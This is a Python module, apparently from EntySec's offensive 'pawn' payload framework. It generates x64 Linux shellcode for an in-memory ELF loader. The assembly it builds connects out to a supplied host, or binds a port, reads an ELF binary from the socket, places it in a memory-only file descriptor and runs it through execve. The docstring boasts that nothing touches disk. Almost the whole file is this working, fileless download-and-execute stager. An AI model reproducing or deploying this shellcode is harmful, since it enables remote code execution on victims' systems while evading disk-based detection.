"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from typing import Optional
from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket


class Loader(object):
    """ Subclass of pawn.linux.x64 module.

    This subclass of pawn.linux.x64 module is intended for
    providing an implementation of in-memory ELF loader.
    """

    def __init__(self) -> None:
        super().__init__()

        self.assembler = Assembler()
        self.socket = Socket()

    def generate_loader(self, *args, **kwargs) -> bytes:
        """ Generate loader from get_loader().

        :return bytes: shellcode
        """

        loader = self.get_loader(*args, **kwargs)
        return self.assembler.assemble('x64', loader)

    def get_loader(self, host: str, port: int, bind: bool = False,
                   length: Optional[int] = None, reliable: bool = True) -> str:
        """ Generate in-memory ELF loader.

        Note: What loader does?

              - Connects or binds to the specific port and host
              - Reads ELF file length from socket
              - Creates temporary file descriptor
              - Allocates memory space for ELF
              - Reads ELF file in memory
              - Writes read ELF to the file descriptor
              - Obtains file descriptor filename from procfs
              - Executes filename

              In result, nothing is dropped on disk and everything executes in-memory,
              no temporary files, no sh*t.

        :param str host: host to bind or connect
        :param int port: port to bind or connect
        :param bool bind: True to bind, False to connect
        :param Optional[int] length: ELF length, None to receive
        :param bool reliable: check for errors and safe exit
        """

        payload = dedent("""\
            start:
                push 0x29
                pop rax
                cdq
                push 0x2
                pop rdi
                push 0x1
                pop rsi
                syscall
        """)

        port = self.socket.pack_port(port)

        if not bind:
            host = self.socket.pack_host(host)

            payload += dedent(f"""\
                    xchg rdi, rax
                    movabs rcx, 0x{host.hex()}{port.hex()}0002
                    push rcx
                    mov rsi, rsp
                    push 0x10
                    pop rdx
                    push 0x2a
                    pop rax
                    syscall
            """)

        else:
            payload += dedent(f"""\
                    xchg rdi, rax
                    push rdx
                    mov dword ptr [rsp], 0x{port.hex()}0002
                    mov rsi, rsp
                    push 0x10
                    pop rdx
                    push 0x32
                    pop rax
                    syscall
            """)

        if length:
            payload += dedent(f"""\
                    push 0x{length.to_bytes(8, 'little').hex()}
            """)

        else:
            payload += dedent(f"""\
                    push 0x8
                    pop rdx
                    push 0x0
                    lea rsi, [rsp]
                    xor rax, rax
                    syscall
            """)

        payload += dedent("""\
                pop r12
                push rdi
                pop r13

                xor rax, rax
                push rax
                push rsp
                sub rsp, 8
                mov rdi, rsp
                push 0x13f
                pop rax
                xor rsi, rsi
                syscall

                push rax
                pop r14

                push 0x9
                pop rax
                xor rdi, rdi
                push r12
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

                push rax
                pop r15
        """)

        if reliable:
            payload += dedent(f"""\
                    test rax, rax
                    js fail
            """)

        payload += dedent(f"""\
                xor rax, rax
                push r13
                pop rdi
                push r15
                pop rsi
                push r12
                pop rdx
                syscall

                push 0x1
                pop rax
                push r14
                pop rdi
                push r12
                pop rdx
                syscall

                add rsp, 16
                mov qword ptr [rsp], 0x6f72702f
                mov qword ptr [rsp+4], 0x65732f63
                mov qword ptr [rsp+8], 0x662f666c
                mov qword ptr [rsp+12], 0x002f64
                push r14
                pop rax
                lea rbx, [rsp+14]
                push 0x10
                pop rcx
                xor rdi, rdi
                push rax
                pop rsi

            number_len_loop:
                xor rdx, rdx
                div rcx
                inc rdi
                test rax, rax
                jnz number_len_loop

            convert_loop:
                xor dx, dx
                div rcx
                add dx, 48
                or [rbx+rdi], dx
                dec rdi

                test rax, rax
                jnz convert_loop

            end:
                lea rdi, [rsp]
                push 0x3b
                pop rax
                cdq
                push rdx
                push rdi
                mov rsi, rsp
                syscall
        """)

        if reliable:
            payload += dedent("""\
                fail:
                    push 0xb
                    pop rax
                    push r15
                    pop rdi
                    push r12
                    pop rsi
                    syscall

                    push 0x3
                    pop rax
                    push r14
                    pop rdi
                    syscall

                    push r13
                    pop rdi
                    syscall

                    push 0x3c
                    pop rax
                    xor rdi, rdi
                    syscall
            """)

        return payload
